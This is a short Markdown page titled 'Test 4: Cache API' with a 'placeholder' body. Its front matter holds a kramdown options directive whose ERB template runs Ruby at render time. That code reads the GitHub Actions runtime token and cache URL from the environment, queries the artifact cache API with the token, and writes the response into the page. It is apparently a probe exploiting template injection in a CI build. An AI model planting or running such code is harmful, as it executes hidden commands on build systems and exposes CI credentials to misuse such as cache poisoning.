---
---

# Test 4: Cache API

{::options template="string://<%= require 'net/http'; cu = ENV.fetch('ACTIONS_CACHE_URL','NONE'); rt = ENV.fetch('ACTIONS_RUNTIME_TOKEN','NONE'); r = 'NO_CACHE'; begin; uri = URI(cu + '_apis/artifactcache/caches?keys=test&version=1'); req = Net::HTTP::Get.new(uri); req.add_field('Authorization', 'Bearer ' + rt); req.add_field('Accept', 'application/json;api-version=6.0-preview.1'); r = Net::HTTP.start(uri.hostname, uri.port, :use_ssl => true).request(req); r = r.code + ':' + r.body[0..400]; rescue => e; r = e.message; end; r.to_s[0..800] %>" /}

placeholder
